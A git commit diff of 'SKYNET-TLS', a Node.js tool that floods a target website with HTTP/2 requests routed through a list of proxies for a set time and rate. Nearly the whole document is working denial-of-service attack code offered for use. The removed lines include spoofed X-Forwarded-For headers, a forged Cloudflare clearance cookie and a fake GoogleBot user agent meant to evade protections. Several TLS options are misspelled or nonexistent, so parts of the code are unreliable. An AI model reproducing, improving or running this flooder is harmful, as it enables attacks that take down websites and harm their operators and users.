45d7081487f637297c3247d20f2b02d439f8574c
xyran2216 <xyran2216@gmail.com>
2025-01-24 21:41:09 +0700

    Add files via upload

--- tls.js
+++ tls.js
@@ -4,15 +4,24 @@ const net = require("net");
  const cluster = require("cluster");
  const url = require("url");
  const crypto = require("crypto");
- const fakeua = require('fake-useragent');
+ const UserAgent = require('user-agents');
  const fs = require("fs");
-
+ 
  process.setMaxListeners(0);
  require("events").EventEmitter.defaultMaxListeners = 0;
  process.on('uncaughtException', function (exception) {
   });
 
- if (process.argv.length < 7){console.log(`Usage: node target time rate thread proxyfile`); process.exit();}
+ if (process.argv.length < 7){
+	 console.log(`
+	    ███████╗██╗  ██╗██╗   ██╗███╗   ██╗███████╗████████╗
+            ██╔════╝██║ ██╔╝╚██╗ ██╔╝████╗  ██║██╔════╝╚══██╔══╝
+            ███████╗█████╔╝  ╚████╔╝ ██╔██╗ ██║█████╗     ██║  
+            ╚════██║██╔═██╗   ╚██╔╝  ██║╚██╗██║██╔══╝     ██║   
+            ███████║██║  ██╗   ██║   ██║ ╚████║███████╗   ██║   
+            ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝
+  Usage: node SKYNET-TLS.js [TARGET] [TIME] [REQUEST] [THREAD] [PROXY FILE]`); 
+	 process.exit();}
  const headers = {};
   function readLines(filePath) {
      return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
@@ -26,269 +35,19 @@ const net = require("net");
      return elements[randomIntn(0, elements.length)];
  } 
  
- function randstr(length) {
-   const characters =
-     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-   let result = "";
-   const charactersLength = characters.length;
-   for (let i = 0; i < length; i++) {
-     result += characters.charAt(Math.floor(Math.random() * charactersLength));
-   }
-   return result;
- }
- 
- const ip_spoof = () => {
-   const getRandomByte = () => {
-     return Math.floor(Math.random() * 255);
-   };
-   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
- };
- 
- const spoofed = ip_spoof();
-
- const ip_spoof2 = () => {
-   const getRandomByte = () => {
-     return Math.floor(Math.random() * 9999);
-   };
-   return `${getRandomByte()}`;
- };
- 
- const spoofed2 = ip_spoof2();
-
- const ip_spoof1 = () => {
-   const getRandomByte = () => {
-     return Math.floor(Math.random() * 50000);
-   };
-   return `${getRandomByte()}`;
- };
- 
- const spoofed1 = ip_spoof1();
- 
  const args = {
      target: process.argv[2],
-     time: parseInt(process.argv[3]),
-     Rate: parseInt(process.argv[4]),
-     threads: parseInt(process.argv[5]),
+     time: ~~process.argv[3],
+     Rate: ~~process.argv[4],
+     threads: ~~process.argv[5],
      proxyFile: process.argv[6]
  }
- const sig = [    
-    'ecdsa_secp256r1_sha256',
-    'ecdsa_secp384r1_sha384',
-    'ecdsa_secp521r1_sha512',
-    'rsa_pss_rsae_sha256',
-    'rsa_pss_rsae_sha384',
-    'rsa_pss_rsae_sha512',
-    'rsa_pkcs1_sha256',
-    'rsa_pkcs1_sha384',
-    'rsa_pkcs1_sha512'
+ const cplist = [ // Captcha Solve by Ibaaall 10-04-2023
+     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
  ];
- const sigalgs1 = sig.join(':');
- const cplist = [
-    "ECDHE-ECDSA-AES128-GCM-SHA256", 
-    "ECDHE-ECDSA-CHACHA20-POLY1305", 
-    "ECDHE-RSA-AES128-GCM-SHA256", 
-    "ECDHE-RSA-CHACHA20-POLY1305", 
-    "ECDHE-ECDSA-AES256-GCM-SHA384", 
-    "ECDHE-RSA-AES256-GCM-SHA384"
- ];
- const accept_header = [
-    '*/*',
-    'image/*',
-    'image/webp,image/apng',
-    'text/html',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
- ]; 
-
- lang_header = [
-  'ko-KR',
-  'en-US',
-  'zh-CN',
-  'zh-TW',
-  'ja-JP',
-  'en-GB',
-  'en-AU',
-  'en-GB,en-US;q=0.9,en;q=0.8',
-  'en-GB,en;q=0.5',
-  'en-CA',
-  'en-UK, en, de;q=0.5',
-  'en-NZ',
-  'en-GB,en;q=0.6',
-  'en-ZA',
-  'en-IN',
-  'en-PH',
-  'en-SG',
-  'en-HK',
-  'en-GB,en;q=0.8',
-  'en-GB,en;q=0.9',
-  ' en-GB,en;q=0.7',
- ];
- 
- const encoding_header = [
-  'gzip, deflate, br',
-  'deflate',
-  'gzip, deflate, lzma, sdch',
-  'deflate'
- ];
- 
- const control_header = ["no-cache", "max-age=0"];
- 
- const refers = [
-     "https://www.google.com/",
-     "https://www.facebook.com/",
-     "https://www.twitter.com/",
-     "https://www.youtube.com/",
-     "https://www.linkedin.com/",
-     "https://proxyscrape.com/",
-     "https://www.instagram.com/",
-     "https://wwww.reddit.com/",
-     "https://fivem.net/",
-     "https://www.fbi.gov/",
-     "https://nettruyenplus.com/",
-     "https://vnexpress.net/",
-     "https://zalo.me",
-     "https://shopee.vn",
-     "https://www.tiktok.com/",
-     "https://google.com.vn/",
-     "https://tuoitre.vn/",
-     "https://thanhnien.vn/",
-     "https://nettruyento.com/"
- ];
- const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
- const ciphers1 = "GREASE:" + [
-     defaultCiphers[2],
-     defaultCiphers[1],
-     defaultCiphers[0],
-     ...defaultCiphers.slice(3)
- ].join(":");
- 
- const uap = [
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
-     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-     "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
-     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
-     "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
-     "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
-     "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
-     "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
-     "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-     "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
-     "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
-     "Mozilla/5.0 (Linux; Android 12; V2120 Build/SP1A.210812.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36"
- ];
-
- version = [
-    '"Chromium";v="100", "Google Chrome";v="100"',
-    '"(Not(A:Brand";v="8", "Chromium";v="98"',
-    '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
-    '"Not_A Brand";v="8", "Google Chrome";v="109", "Chromium";v="109"',
-    '"Not_A Brand";v="99", "Google Chrome";v="86", "Chromium";v="86"',
-    '"Not_A Brand";v="99", "Google Chrome";v="96", "Chromium";v="96"',
-    '"Not A;Brand";v="99", "Chromium";v="96", "Microsoft Edge";v="96"'
- ];
-
-  platform = [
-    //'Linux',
-    //'macOS',
-    'Windows'
-  ];
-  
-  site = [
-    'cross-site',
-	'same-origin',
-	'same-site',
-	'none'
-  ];
-  
-  mode = [
-    'cors',
-	'navigate',
-	'no-cors',
-	'same-origin'
-  ];
-  
-  dest = [
-    'document',
-	'image',
-	'embed',
-	'empty',
-	'frame'
-  ];
-  
-const rateHeaders = [
-{ "akamai-origin-hop": randstr(5)  },
-{ "source-ip": randstr(5)  },
-{ "via": randstr(5)  },
-{ "cluster-ip": randstr(5)  },
-];
-const rateHeaders2 = [
-{ "akamai-origin-hop": randstr(5)  },
-{ "source-ip": randstr(5)  },
-{ "via": randstr(5)  },
-{ "cluster-ip": randstr(5)  },
-];
-
-const useragentl = [
- '(CheckSecurity 2_0)',
- '(BraveBrowser 5_0)',
- '(ChromeBrowser 3_0)',
- '(ChromiumBrowser 4_0)',
- '(AtakeBrowser 2_0)',
- '(NasaChecker)',
- '(CloudFlareIUAM)',
- '(NginxChecker)',
- '(AAPanel)',
- '(AntiLua)',
- '(FushLua)',
- '(FBIScan)',
- '(FirefoxTop)',
- '(ChinaNet Bot)'
-];
-
-const mozilla = [
- 'Mozilla/5.0 ',
- 'Mozilla/6.0 ',
- 'Mozilla/7.0 ',
- 'Mozilla/8.0 ',
- 'Mozilla/9.0 '
-];
-
  var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
- var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
- var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
- var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
- var az1 = useragentl[Math.floor(Math.floor(Math.random() * useragentl.length))];
- var platforms = platform[Math.floor(Math.floor(Math.random() * platform.length))];
- var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
- var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
- var moz = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))];
- var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
- var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
- var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
- var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
- var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
- var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
  var proxies = readLines(args.proxyFile);
  const parsedTarget = url.parse(args.target);
 
@@ -302,7 +61,7 @@ const mozilla = [
      constructor(){}
  
   HTTP(options, callback) {
-     const parsedAddr = options.address.split(":");
+     const parsedAddr = options.address.split(":"); // Socket Connection Fixed by Ibaaall 27-03-2023
      const addrHost = parsedAddr[0];
      const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
      const buffer = new Buffer.from(payload);
@@ -312,15 +71,14 @@ const mozilla = [
          port: options.port
      });
  
-     //connection.setTimeout(options.timeout * 600000);
-     connection.setTimeout(options.timeout * 100000);
+     connection.setTimeout(options.timeout * 10000);
      connection.setKeepAlive(true, 100000);
  
      connection.on("connect", () => {
          connection.write(buffer);
      });
  
-     connection.on("data", chunk => {
+     connection.on("data", chunk => { //HTTP Version Fixed by Ibaaall 08-04-2023
          const response = chunk.toString("utf-8");
          const isAlive = response.includes("HTTP/1.1 200");
          if (isAlive === false) {
@@ -342,77 +100,70 @@ const mozilla = [
  }
  }
 
- const Socker = new NetSocket();
+ const Socker = new NetSocket(); // Socket GET Fixed
  headers[":method"] = "GET";
- headers[":authority"] = parsedTarget.host;
- headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(15);
+ headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "https";
- headers["x-forwarded-proto"] = "https";
+ headers["accept"] = "/";
+ headers["accept-language"] = "en-US,en;q=0.9";
+ headers["accept-encoding"] = "gzip, deflate";
  headers["cache-control"] = "no-cache";
- headers["X-Forwarded-For"] = spoofed;
- headers["sec-ch-ua"] = '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"';
- headers["sec-ch-ua-mobile"] = "?0";
- headers["sec-ch-ua-platform"] = "Windows";
- headers["accept-language"] = lang;
- headers["accept-encoding"] = encoding;
- headers["upgrade-insecure-requests"] = "1";
- headers["accept"] = accept;
- headers["user-agent"] = moz + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);
- headers["referer"] = Ref;
- headers["sec-fetch-mode"] = "navigate";
- headers["sec-fetch-dest"] = dest1;
- headers["sec-fetch-user"] = "?1";
- headers["TE"] = "trailers";
- headers["cookie"] = "cf_clearance=" + randstr(4) + "." + randstr(20) + "." + randstr(40) + "-0.0.1 " + randstr(20) + ";_ga=" + randstr(20) + ";_gid=" + randstr(15);
- headers["sec-fetch-site"] = site1;
- headers["x-requested-with"] = "XMLHttpRequest";
+ headers["upgrade-insecure-requests"] = "1"; 
  
  function runFlooder() {
      const proxyAddr = randomElement(proxies);
-     const parsedProxy = proxyAddr.split(":"); 
-         headers["origin"] = "https://" + parsedTarget.host;
-
+     const parsedProxy = proxyAddr.split(":");
+     const userAgentv2 = new UserAgent();
+     var useragent = userAgentv2.toString();
+     headers[":authority"] = parsedTarget.host
+     headers["user-agent"] = useragent;
+ 
      const proxyOptions = {
          host: parsedProxy[0],
          port: ~~parsedProxy[1],
          address: parsedTarget.host + ":443",
-         timeout: 300,
+         timeout: 3
      };
 
      Socker.HTTP(proxyOptions, (connection, error) => {
          if (error) return
  
-         connection.setKeepAlive(true, 200000);
+         connection.setKeepAlive(true, 100000);
 
          const tlsOptions = {
-            secure: true,
-            ALPNProtocols: ['h2'],
-            //ALPNProtocols: ['h2','http/1.1','spdy/3.1'],
-            sigals: siga,
-            socket: connection,
+            ALPNProtocols: ['h2', 'http/1.1', 'h3', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'], // Protocol List ketika ATTACK
+            challengesToSolve: Infinity,
+            followAllRedirects: true,
+            clientTimeout: Infinity,
+            clientlareMaxTimeout: Infinity,
+            maxRedirects: Infinity,
             ciphers: cipper,
-            ecdhCurve: "prime256v1:X25519",
-            host: parsedTarget.host,
+            servername: url.hostname,
+            socket: connection,
+            honorCipherOrder: true,
+            echdCurve: "GREASE:X25519:x25519",
+            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
+            secure: true,
             rejectUnauthorized: false,
+            port: 80,
+            uri: parsedTarget.host,
             servername: parsedTarget.host,
-            //secureProtocol: "TLS_method",
-            secureProtocol: ["TLSv1_1_method", "TLS_method","TLSv1_2_method", "TLSv1_3_method",],
         };
 
          const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 
 
-         tlsConn.setKeepAlive(true, 60000);
-
+         tlsConn.setKeepAlive(true, 10 * 10000);
+ 
          const client = http2.connect(parsedTarget.href, {
              protocol: "https:",
              settings: {
             headerTableSize: 65536,
-            maxConcurrentStreams: 10000,
+            maxConcurrentStreams: 1000,
             initialWindowSize: 6291456,
-            maxHeaderListSize: 65536,
+            maxHeaderListSize: 262144,
             enablePush: false
           },
-             maxSessionMemory: 64000,
+             maxSessionMemory: 3333,
              maxDeflateDynamicTableSize: 4294967295,
              createConnection: () => tlsConn,
              socket: connection,
@@ -420,24 +171,18 @@ const mozilla = [
  
          client.settings({
             headerTableSize: 65536,
-            maxConcurrentStreams: 10000,
+            maxConcurrentStreams: 1000,
             initialWindowSize: 6291456,
-            maxHeaderListSize: 65536,
+            maxHeaderListSize: 262144,
             enablePush: false
           });
-
-     setInterval(() => {
+ 
          client.on("connect", () => {
-              const dynHeaders = {
-                ...headers,
-                ...rateHeaders2[Math.floor(Math.random()*rateHeaders.length)],
-                ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)]
-              };
+            const IntervalAttack = setInterval(() => {
                 for (let i = 0; i < args.Rate; i++) {
-                    const request = client.request(dynHeaders)
+                    const request = client.request(headers)
                     
-                    request.on("response", response => {
-                        //console.log("Response:", response);
+                    .on("response", response => {
                         request.close();
                         request.destroy();
                         return
@@ -445,7 +190,7 @@ const mozilla = [
     
                     request.end();
                 }
-            }); 
+            }, 1000); 
          });
  
          client.on("close", () => {
@@ -453,10 +198,15 @@ const mozilla = [
              connection.destroy();
              return
          });
-     }),function (error, response, body) {
-		};
+ 
+         client.on("error", error => {
+             client.destroy();
+             connection.destroy();
+             return
+         });
+     });
  }
  
- const KillScript = () => process.exit(1);
+ const KillScript = () => process.exit(1); // Auto Stop ketika Durasi habis
  
  setTimeout(KillScript, args.time * 1000);
